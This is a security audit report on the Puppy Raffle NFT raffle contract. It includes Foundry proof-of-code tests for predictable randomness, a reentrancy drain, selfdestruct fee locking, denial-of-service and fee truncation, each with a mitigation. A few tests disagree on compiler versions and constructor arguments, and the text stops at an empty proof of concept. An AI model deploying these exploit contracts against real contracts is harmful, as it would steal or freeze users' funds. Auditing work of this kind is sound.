# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### 🐶 Puppy Raffle Protocol

Puppy Raffle is an on-chain game that lets anyone vie for a puppy-themed ERC-721 NFT while collecting a prize pool in ETH.

1. **Enter** – Users call `enterRaffle()` with the fixed `entranceFee` and an array of addresses to register (duplicates rejected). Each address is stored in `players[]` and marked as active.
2. **Refund** – Before a winner is drawn, any player may call `refund()` to reclaim their stake, freeing their slot in the array.
3. **Raffle Cycle** – A raffle lasts `raffleDuration` seconds, tracked by `raffleStartTime`. Once the period elapses, anyone can trigger `selectWinner()`.
4. **Winner Selection** – Pseudo-randomness (block data) picks an index in `players[]`. The contract mints a Puppy NFT to that address, assigns a rarity, and transfers the accumulated pot minus fees.
5. **Fees** – A percentage of each entry accrues in `totalFees`. The owner can set a `feeAddress` and withdraw fees via `withdrawFees()` when no players remain.
6. **Administration** – The deployer inherits `Ownable`, enabling fee-address changes but no control over winner selection.

The result is a trust-minimized, self-running raffle where every round yields a collectible Puppy NFT and distributes ETH transparently.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-3]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-4]. Reentrancy issue in PuppyRaffle::refund
[H-5]. DOS issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. DOS issue in PuppyRaffle::enterRaffle
[M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-4]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner
[M-5]. DOS issue in PuppyRaffle::selectWinner
[M-6]. DOS issue in PuppyRaffle::refund
[M-7]. Unexpected Eth issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Event Consistency issue in PuppyRaffle::selectWinner
[L-2]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund
## Info Risk Findings
[I-1]. Pausable Emergency Stop issue in PuppyRaffle::NA
[I-2]. Pragma issue in PuppyRaffle::NA
[I-3]. Pragma issue in PuppyRaffle::NA
[I-4]. Integer Overflow issue in PuppyRaffle::enterRaffle
[I-5]. DOS issue in PuppyRaffle::selectWinner
[I-6]. Event Consistency issue in PuppyRaffle::withdrawFees
[I-7]. Access Control issue in PuppyRaffle::constructor


### Number of Findings
- H: 5
- M: 7
- L: 2
- I: 7



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses on-chain data (`msg.sender`, `block.timestamp`, `block.difficulty`) as a source of randomness to determine the raffle winner. These values are predictable and can be manipulated by miners or validators, allowing them to influence the outcome and unfairly win the raffle. A malicious miner who is also a player can reorder or withhold transactions to ensure they win.

## Impact
The raffle's fairness is compromised. A miner or an entity with control over block production can guarantee they win the prize pool and the NFT, leading to a loss of funds for legitimate players and destroying the contract's credibility.

## Proof of Concept
1. The attacker first looks at the exact list (and ordering) of players that have already been pushed into the `players` array.
2. Off-chain, for every legal value of `block.timestamp` he may publish (a miner can shift it within ~900 seconds), the attacker computes:
   `winnerIndex = uint256(keccak256(abi.encodePacked(attacker, futureTime, block.difficulty))) % players.length;`
   If `players[winnerIndex] == attacker`, the attacker simply mines the block with that timestamp and includes his `selectWinner` transaction. Otherwise he withholds / reorders and tries another timestamp. Because the hash inputs are completely under the miner’s control (`msg.sender`, `block.timestamp`, ordering), he can find a winning timestamp in a handful of trials, guaranteeing that he receives the whole prize pool and the newly minted NFT while honest users lose their entrance fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessPredictability is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1 days;
    address constant FEE_ADDRESS = address(99);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
        vm.deal(address(this), 10 ether);
    }

    function testPredictableRandomness() public {
        // create four distinct players where index 2 is the attacker
        address attacker = address(1);
        address p1 = address(2);
        address p2 = address(3);
        address p3 = address(4);

        address[] memory participants = new address[](4);
        participants[0] = p1;
        participants[1] = p2;
        participants[2] = attacker;
        participants[3] = p3;

        // anyone can pay for all players at once
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(participants);

        // raffle period is over
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // attacker locally predicts the outcome BEFORE sending the tx
        uint256 predictedIndex = uint256(
            keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))
        ) % participants.length;
        address predictedWinner = participants[predictedIndex];

        // call selectWinner from the attacker address
        vm.prank(attacker);
        raffle.selectWinner();

        // prediction matches actual result → randomness is controllable/predictable
        assertEq(raffle.previousWinner(), predictedWinner);
    }
}

## Suggested Mitigation
The randomness source should not be based on on-chain, predictable variables. Use a solution that provides verifiable, off-chain randomness, such as Chainlink VRF (Verifiable Random Function). This involves a two-step process (request and fulfill) to get a secure random number.

```solidity
// Example using Chainlink VRF (conceptual)
import "@chainlink/contracts/src/v0.7/interfaces/LinkTokenInterface.sol";
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    // ... other variables
    bytes32 internal keyHash;
    uint256 internal feeVRF;
    uint256 public randomResult;

    event RequestedRandomness(bytes32 requestId);

    constructor(
        // ... other params
        address vrfCoordinator,
        address linkToken,
        bytes32 _keyHash,
        uint256 _feeVRF
    ) 
        VRFConsumerBase(vrfCoordinator, linkToken)
        // ...
    {
        keyHash = _keyHash;
        feeVRF = _feeVRF;
    }

    function selectWinner() external {
        // ... checks ...
        require(LINK.balanceOf(address(this)) >= feeVRF, "Not enough LINK - fill contract!");
        requestRandomness(keyHash, feeVRF);
    }

    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        uint256 winnerIndex = randomness % players.length;
        address winner = players[winnerIndex];
        // ... rest of the logic to pay winner and mint NFT
    }
    // ... rest of contract
}
```

## [H-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The `totalFees` state variable is of type `uint64`. In the `selectWinner` function, the calculated `fee` (a `uint256`) is down-casted to `uint64` before being added to `totalFees`. If the fee for a single raffle exceeds `type(uint64).max` (approx. 18.4 ETH), the value will be truncated, leading to an incorrect `totalFees` amount. Furthermore, even with smaller fees, the cumulative `totalFees` can overflow its `uint64` limit over multiple raffles. This will cause the check in `withdrawFees` (`address(this).balance == uint256(totalFees)`) to fail, as the contract's ether balance will be much larger than the overflowed `totalFees` value. This permanently locks the fees in the contract.

## Impact
A truncation or overflow of `totalFees` will lead to a permanent DoS of the `withdrawFees` function. The collected fees will be locked in the contract forever, resulting in a total loss of protocol revenue.

## Proof of Concept
1. The owner sets the `entranceFee` to 1 ETH.
2. 100 players enter the raffle. `totalAmountCollected` is 100 ETH.
3. `selectWinner` is called. `fee` is calculated as `(100 ETH * 20) / 100 = 20 ETH`.
4. `type(uint64).max` is `~18.4e18` wei. `20 ETH` is `20e18` wei, which is greater.
5. The cast `uint64(fee)` truncates the value, resulting in `uint64(20e18)`, which is `20e18 % 2**64 = 1553133692095283200` (approx 1.55 ETH).
6. `totalFees` is updated with this incorrect, smaller value.
7. When `withdrawFees` is called, it checks `address(this).balance == uint256(totalFees)`. The balance is `20 ETH`, but `totalFees` is `~1.55 ETH`. The check fails, and the transaction reverts.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeeOverflowLockTest is Test {
    PuppyRaffle raffle;

    uint256 constant ENTRANCE_FEE = 4 ether;
    uint256 constant RAFFLE_DURATION = 1 days;
    address constant FEE_ADDRESS = address(0xfee);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
        // fund this contract so it can pay the entrance fees
        vm.deal(address(this), 1000 ether);
    }

    function test_TotalFeesOverflow_LocksOwnerFunds() public {
        // Perform 5 raffles, each collecting a 4 ETH fee (20 ETH total)
        for (uint256 i; i < 5; ++i) {
            address[] memory players = new address[](5);
            for (uint256 j; j < 5; ++j) {
                players[j] = address(uint160(uint(keccak256(abi.encode(i, j)))));
            }

            raffle.enterRaffle{value: ENTRANCE_FEE * 5}(players);
            vm.warp(block.timestamp + RAFFLE_DURATION + 1);
            raffle.selectWinner();
        }

        // Contract really holds 20 ETH but totalFees has wrapped below that value
        assertEq(address(raffle).balance, 20 ether, "unexpected contract balance");
        assertTrue(raffle.totalFees() < 20 ether, "totalFees should have overflowed");

        // Withdrawal reverts forever because balance != totalFees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The `totalFees` variable should be changed from `uint64` to `uint256` to prevent overflow, as it tracks ether values which can easily exceed the `uint64` limit. Additionally, use a safe math library (like OpenZeppelin's `SafeMath` for Solidity <0.8.0) for all arithmetic operations to prevent overflow/underflow bugs.

```solidity
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;

    // ...
    uint256 public totalFees;
    // ...

    function selectWinner() external {
        // ...
        uint256 totalAmountCollected = uint256(players.length).mul(entranceFee);
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.mul(20).div(100);

        totalFees = totalFees.add(fee);
        // ...
    }

    function withdrawFees() external {
        // The logic here is also flawed as it assumes balance == totalFees.
        // It should just withdraw the amount stored in totalFees.
        require(players.length == 0, "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
}
```

## [H-3]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The winner selection and NFT rarity assignment in `selectWinner` depend on a weak source of randomness derived from `block.timestamp`, `block.difficulty`, and `msg.sender`. These values are public, predictable, and can be influenced by blockchain miners. A miner participating in the raffle can compute the hash for a future block and choose to mine it only if the outcome makes them the winner. This compromises the fairness and integrity of the raffle.

## Impact
The raffle is not fair. Miners have a significant advantage and can effectively decide to make themselves win, guaranteeing them the prize pool. This undermines the core premise of the raffle and will lead to a loss of user trust and funds.

## Proof of Concept
Because msg.sender is part of the entropy, a user can locally search for a timestamp that makes him the winner and then call selectWinner in that same block.

Assume the players array is [attacker, Alice, Bob, Carol] in that order.

1. Off-chain, the attacker brute-forces a timestamp `t >= raffleStartTime + raffleDuration` until
   `uint256(keccak256(abi.encodePacked(attacker, t, currentDifficulty))) % 4 == 0`.
   With 4 players the probability is 1/4, so the search space is small.
2. The attacker broadcasts a transaction with `selectWinner()` after setting its gas price high enough to be mined in a block whose timestamp is `t` (or, if he controls a miner, simply mines the block himself).
3. The contract deterministically picks index 0 and transfers 80 % of the pot to the attacker.

No miner control is strictly required – only the ability to choose when to call the function.

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract PredictableRandomnessTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;

    address attacker = address(0xA11CE);
    address alice    = address(0xB0B);
    address bob      = address(0xC0C);
    address carol    = address(0xD0D);

    function setUp() public {
        vm.deal(attacker, 10 ether);
        vm.deal(alice,    10 ether);
        vm.deal(bob,      10 ether);
        vm.deal(carol,    10 ether);

        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), 1 days);

        address[] memory players = new address[](4);
        players[0] = attacker;
        players[1] = alice;
        players[2] = bob;
        players[3] = carol;

        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
    }

    function testAttackerCanPredictAndWin() public {
        // Fast-forward to after the raffle duration
        uint256 targetTimestamp = block.timestamp + 1 days;
        uint256 diff = block.difficulty; // current difficulty

        // Search for a timestamp that lets the attacker win
        for (uint256 i = 0; i < 500; i++) {
            if (uint256(keccak256(abi.encodePacked(attacker, targetTimestamp + i, diff))) % 4 == 0) {
                targetTimestamp = targetTimestamp + i;
                break;
            }
        }

        // Set the block variables to the chosen values
        vm.warp(targetTimestamp);
        vm.difficulty(diff);

        // Attacker triggers winner selection
        vm.prank(attacker);
        raffle.selectWinner();

        // The attacker must have become the previousWinner
        assertEq(raffle.previousWinner(), attacker, "attacker should be the selected winner");
    }
}

## Suggested Mitigation
Do not use on-chain data like `block.timestamp` or `block.difficulty` for randomness. The recommended solution is to use a Verifiable Random Function (VRF) provided by an oracle service like Chainlink. A VRF provides cryptographically secure, tamper-proof, and unpredictable randomness.

```solidity
// This is a simplified example of using Chainlink VRF.
// It requires a subscription and significant architectural changes.

import "@chainlink/contracts/src/v0.7/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.7/VRFConsumerBaseV2.sol";

contract PuppyRaffle is VRFConsumerBaseV2 /* ... */ {
    VRFCoordinatorV2Interface COORDINATOR;
    // ... other VRF variables

    function selectWinner() external {
        // ... checks
        // Instead of calculating winner, request randomness
        COORDINATOR.requestRandomWords(/* ... params ... */);
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        // ... continue with winner selection logic using the secure random number ...
    }
}
```

## [H-4]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function is vulnerable to a reentrancy attack because it sends Ether to the player before updating the state. The line `players[playerIndex] = address(0);` is executed after the external call `Address.sendValue(address(msg.sender), entranceFee);`, which violates the Checks-Effects-Interactions pattern.

## Impact
A malicious contract can repeatedly call the `refund` function within its `receive()` or `fallback()` function, draining more than its initial `entranceFee`. Since the prize pool is funded by all entry fees, the attacker could potentially drain a significant portion of the funds held by the contract before other players or the winner can claim them.

## Proof of Concept
1. An attacker deploys a contract (`AttackerContract`).
2. The attacker calls `enterRaffle` from `AttackerContract`, making it a player.
3. The attacker calls `puppyRaffle.refund()` from `AttackerContract`.
4. `PuppyRaffle` sends the `entranceFee` back to `AttackerContract`.
5. The `receive()` function of `AttackerContract` is triggered. Inside `receive()`, it calls `puppyRaffle.refund()` again.
6. Because `players[playerIndex]` has not been set to `address(0)` yet, the `require` checks pass, and another refund is sent.
7. This loop continues, draining funds from the `PuppyRaffle` contract on each call.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 public depth;

    constructor(PuppyRaffle _raffle, uint256 _entranceFee) payable {
        raffle = _raffle;
        entranceFee = _entranceFee;
    }

    function attack() external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(arr);
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        if (depth < 5) {
            depth++;
            uint256 idx = raffle.getActivePlayerIndex(address(this));
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xfee), 1 days);

        // Prefund raffle with 4 honest players
        address sponsor = address(0xbeef);
        vm.deal(sponsor, 10 ether);
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = address(0x4);
        vm.prank(sponsor);
        raffle.enterRaffle{value: FEE * 4}(players);
    }

    function test_refundReentrancy() public {
        // Deploy attacker and give it exactly 1 entrance fee
        ReentrancyAttacker attacker = new ReentrancyAttacker(raffle, FEE);
        vm.deal(address(attacker), FEE);

        uint256 attackerBalBefore = address(attacker).balance;
        uint256 raffleBalBefore = address(raffle).balance;

        attacker.attack();

        uint256 attackerBalAfter = address(attacker).balance;
        uint256 raffleBalAfter = address(raffle).balance;

        // Attacker should have gained 5 * FEE (paid once, refunded 6 times)
        assertEq(attackerBalAfter, attackerBalBefore + 5 * FEE);
        assertEq(raffleBalAfter, raffleBalBefore - 6 * FEE);
    }
}

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern by reordering the statements in the `refund` function. The state must be updated *before* the external call is made. This prevents recursive calls from exploiting the stale state.

```solidity
// src/PuppyRaffle.sol:PuppyRaffle.refund

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

    // Effect (state change) should happen before interaction
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);

    // Interaction (external call)
    Address.sendValue(address(msg.sender), entranceFee);
}
```

## [H-5]. DOS issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows a player to exit the raffle. However, instead of removing the player from the `players` array, it sets their address at the given index to `address(0)`. The `selectWinner` function picks a winner by generating a random index within `players.length`. If it selects an index that now contains `address(0)`, the function will attempt to mint an NFT to the zero address. OpenZeppelin's `_safeMint` function reverts on such attempts (`ERC721: mint to the zero address`). This causes the entire `selectWinner` transaction to fail, preventing a winner from being drawn. An attacker can abuse this by entering and then refunding multiple times, increasing the number of `address(0)` slots and heightening the probability of `selectWinner` failing, leading to a Denial of Service.

## Impact
The `selectWinner` function can be made to consistently revert, preventing the raffle from ever concluding. This would lock all participants' funds in the contract indefinitely, as there is no other mechanism to distribute the prize pool. The protocol's core utility is broken.

## Proof of Concept
1. Four different EOAs enter the raffle paying the entrance fee.
2. Each of them immediately calls `refund`, turning every slot in `players` into `address(0)` while leaving the array length unchanged (==4).
3. After `raffleDuration` seconds anyone calls `selectWinner`. Whichever index is selected, the address is `address(0)`, so `_safeMint(address(0), …)` reverts with "ERC721: mint to the zero address", permanently blocking the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract DosRefundTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 60;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xbeef), DURATION, "", "", "");
    }

    function test_selectWinnerAlwaysRevertsWhenAllRefunded() public {
        // 1. Four players enter and immediately refund
        address[4] memory players = [address(1), address(2), address(3), address(4)];
        address[] memory arr = new address[](1);
        for (uint256 i = 0; i < players.length; i++) {
            vm.deal(players[i], ENTRANCE_FEE);
            arr[0] = players[i];
            vm.prank(players[i]);
            raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

            uint256 idx = raffle.getActivePlayerIndex(players[i]);
            vm.prank(players[i]);
            raffle.refund(idx);
        }
        // players.length == 4 but every slot is address(0)

        // 2. Wait until raffle is over
        vm.warp(block.timestamp + DURATION + 1);

        // 3. Any call reverts because winner is the zero address
        vm.expectRevert("ERC721: mint to the zero address");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
The `refund` function should correctly remove the player's address from the array instead of replacing it with `address(0)`. A common and gas-efficient pattern is to move the last element into the vacated slot and then shorten the array.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(
            playerAddress != address(0),
            "PuppyRaffle: Player already refunded, or is not active"
        );

        address(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
+       // Move the last element to the place of the one to be removed
+       players[playerIndex] = players[players.length - 1];
+       // Remove the last element
+       players.pop();

        emit RaffleRefunded(playerAddress);
    }
```
Note: This change has a side effect. It re-orders the `players` array, so users can no longer rely on their index remaining constant. An event could be emitted to signal the new index of the moved player.



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function adds new players to the `players` array and then checks for duplicates using a nested loop. This results in a gas cost that grows quadratically (O(n^2)) with the total number of players. An attacker can exploit this by first entering a moderately large number of unique addresses, increasing the gas cost of subsequent `enterRaffle` calls to a level that exceeds the block gas limit. This effectively prevents any other user from joining the raffle, causing a Denial of Service.

## Impact
Legitimate users are unable to join the raffle until the current period ends, effectively locking new participants out for up to `raffleDuration` (10 days in the default deployment).  Funds already inside the contract are safe, but the raffle’s core functionality (accepting new entrants) is unavailable, resulting in a time-bounded denial-of-service.

## Proof of Concept
1. Attacker funds his EOAs and deploys the contract with `raffleDuration = 10 days` and `entranceFee = 0.1 ether`.
2. He prepares an array that contains exactly 170 unique addresses under his control and sends one `enterRaffle` transaction with `gas = blockGasLimit()` (≈ 30 M on mainnet).  
   • 170 players ⇒ 170*169/2 = 14 365 duplicate-checks.  At ≈2 000 gas / check this consumes ≈ 28.7 M gas – the tx still fits into the block.
3. Now the `players` array length is 170.  Any subsequent `enterRaffle` call will execute ≥ 170 extra duplicate-checks (one extra row and one extra column in the triangular matrix).  This adds ≥ 340 000 additional gas, pushing the total cost above the 30 M block gas limit and making every further `enterRaffle` revert with out-of-gas.
4. Until `selectWinner` can be called after the 10-day period, no new player can participate – the raffle is frozen with only the attacker’s addresses.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasGriefingTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 0.1 ether;
    uint256 constant DURATION = 10 days;
    address constant FEE_ADDR = address(0xfee);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, FEE_ADDR, DURATION);
    }

    function test_denial_of_service_by_gas_griefing() public {
        /* attacker fills the array with 170 unique entries */
        uint256 n = 170;
        address[] memory bots = new address[](n);
        for (uint256 i; i < n; ++i) {
            bots[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: ENTRANCE * n}(bots);

        /* a genuine user now tries to join with a reasonable gas cap */
        address victim = address(0xBEEF);
        vm.deal(victim, 1 ether);
        address[] memory arr = new address[](1);
        arr[0] = victim;

        vm.prank(victim);
        vm.expectRevert();                   // out-of-gas → revert
        raffle.enterRaffle{value: ENTRANCE, gas: 8_000_000}(arr);
    }
}

## Suggested Mitigation
Replace the O(n²) duplicate-check with O(1) look-ups using a mapping:

mapping(address => bool) private active;

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "fee");
    for (uint256 i; i < newPlayers.length; ++i) {
        address p = newPlayers[i];
        require(!active[p], "duplicate");
        active[p] = true;
        players.push(p);
    }
    emit RaffleEnter(newPlayers);
}

Remember to clear the `active` flag on refund and after selecting the winner so that future raffles start with an empty set.

## [M-2]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function uses a nested loop to check for duplicate entries in the `players` array. This creates a quadratic time complexity (O(n^2)). As the number of players increases, the gas cost of calling `enterRaffle` grows quadratically. This will eventually make the function too expensive to call, exceeding the block gas limit and effectively creating a Denial of Service on the entry mechanism.

## Impact
The `enterRaffle` function can become unusable once a moderate number of players have joined. This prevents new players from entering the raffle, stalling the game indefinitely if the minimum number of players for the next round cannot be reached.

## Proof of Concept
The gas consumption of enterRaffle grows quadratically with the total number of players because the function walks the whole players array twice (i-scope and j-scope).

Assume a block gas limit of 8 000 000 (the default in most clients).

1. A malicious user calls enterRaffle with 4 500 new addresses (costs 4 500 × entranceFee).  The nested duplicate-check executes (4 500²)/2 ≈ 10 M comparisons and the transaction already consumes ~6 M gas but still fits in the block.
2. The same user (or any subsequent player) tries to add just one more address.  The duplicate-check now performs ~10 M additional comparisons and the call runs out of gas, reverting.
3. From this point on no one can enter the raffle until the round ends, effectively freezing new participation and letting the attacker dominate the odds.

Because there is no upper bound on players length, the attack can always be repeated in the next round.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosOnEnterRaffleTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), 60);
    }

    // helper that bulk-adds `count` unique players
    function _addMany(uint256 count) internal {
        address[] memory addrs = new address[](count);
        for (uint256 i = 0; i < count; i++) {
            addrs[i] = address(uint160(1000 + i));
        }
        raffle.enterRaffle{value: FEE * count}(addrs);
    }

    // Demonstrates the super-linear gas growth deterministically
    function test_GasGrowsQuadratically() public {
        // populate with 20 players first
        _addMany(20);

        // measure gas for adding one extra player now (small n)
        address[] memory one = new address[](1);
        one[0] = address(0xAAAA);
        uint256 gasStartSmall = gasleft();
        raffle.enterRaffle{value: FEE}(one);
        uint256 gasUsedSmall = gasStartSmall - gasleft();

        // add 80 more players (total 101) so n is ~5× larger
        _addMany(80);

        one[0] = address(0xAAAB);
        uint256 gasStartLarge = gasleft();
        raffle.enterRaffle{value: FEE}(one);
        uint256 gasUsedLarge = gasStartLarge - gasleft();

        // Because complexity is O(n^2), gasUsedLarge should grow > n_ratio (≈5)² ≈ 25 times;
        // allow slack and check it is at least 10×.
        assertTrue(gasUsedLarge > gasUsedSmall * 10, "gas did not grow super-linearly");
    }
}


## Suggested Mitigation
Keep a mapping(address => bool) enrolledInCurrentRound and check it instead of the nested double loop.  After pickWinner reset the mapping for the next round.  The duplicate-check inside the input array should be O(n²) at most n = newPlayers.length (which is user-supplied and therefore gas-bounded by the call), while the global check is reduced to O(n) total.

## [M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check, `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!")`, to determine if fees can be withdrawn. This check incorrectly assumes that the contract's balance will only consist of entry fees. Ether can be forcibly sent to any contract via `selfdestruct`. If this happens, `address(this).balance` will become greater than `totalFees`, causing the check to fail permanently.

## Impact
An attacker can permanently lock all collected fees in the contract by sending a small amount of ETH (e.g., 1 wei) via `selfdestruct`. This makes the `withdrawFees` function unusable forever, resulting in a permanent loss of all current and future fee revenue for the protocol owner.

## Proof of Concept
1. The `PuppyRaffle` contract runs, players enter, and a winner is selected. Fees are accumulated in the `totalFees` variable, and `address(this).balance` equals `totalFees`.
2. An attacker deploys a simple contract with a `selfdestruct` function.
3. The attacker calls their contract, which self-destructs and forwards 1 wei to the `PuppyRaffle` contract address.
4. The balance of `PuppyRaffle` is now `totalFees + 1 wei`.
5. The owner of `PuppyRaffle` calls `withdrawFees()`.
6. The `require` statement fails because `address(this).balance != totalFees`. Any subsequent call will also fail, locking the funds forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSender {
    function destruct(address payable recipient) external payable {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle internal raffle;
    uint256 internal constant ENTRANCE_FEE = 1 ether;
    address internal constant FEE_ADDRESS = address(100);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1 days);

        // prepare 5 unique players
        address[] memory players = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            players[i] = vm.addr(i + 1);
        }

        // fund first player and enter all five addresses at once
        vm.deal(players[0], 5 * ENTRANCE_FEE);
        vm.prank(players[0]);
        raffle.enterRaffle{value: 5 * ENTRANCE_FEE}(players);

        // fast-forward so a winner can be selected and fees accrue
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();
    }

    function test_unexpectedEthLocksFees() public {
        uint256 balanceBefore = address(raffle).balance;
        assertGt(balanceBefore, 0);

        // attacker force-sends 1 wei
        ForceSender sender = new ForceSender();
        sender.destruct{value: 1 wei}(payable(address(raffle)));
        assertEq(address(raffle).balance, balanceBefore + 1);

        // owner can no longer withdraw fees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The check in `withdrawFees` is intended to prevent withdrawing fees while a raffle is active, but it uses the contract balance as a proxy for this state. This is fragile. The check should be based on the actual state of the raffle. A more robust and direct check is to ensure the `players` array is empty.

```solidity
// src/PuppyRaffle.sol:PuppyRaffle.withdrawFees
function withdrawFees() external {
    // The original check is fragile. A better check is on the number of players.
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    totalFees = 0;

    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-4]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner

## Description
The contract uses Solidity version 0.7.6, which is outdated and lacks built-in protection against integer overflow and underflow. Several arithmetic operations are performed without using a safe math library.
1. `enterRaffle`: `entranceFee * newPlayers.length` can overflow if a large `newPlayers` array is supplied.
2. `selectWinner`: `players.length * entranceFee` can overflow if the raffle has a large number of players.
3. `selectWinner`: `totalFees`, a `uint64`, is incremented by `fee`, a `uint256`. The down-casting `uint64(fee)` can truncate the value if `fee` exceeds `type(uint64).max`. Subsequently, `totalFees` itself can overflow, wrapping around to zero and causing a loss of accumulated fees.

## Impact
Because the 20 % fee is stored in a uint64, any single raffle that collects more than 18.446 ETH will truncate the stored value. After truncation `address(this).balance` (true fees kept in the contract) no longer matches `totalFees`, so `withdrawFees()` will always revert. This permanently locks all protocol-owned fees in the contract and prevents the owner from ever withdrawing them. User funds are safe, but protocol revenue is lost.

## Proof of Concept
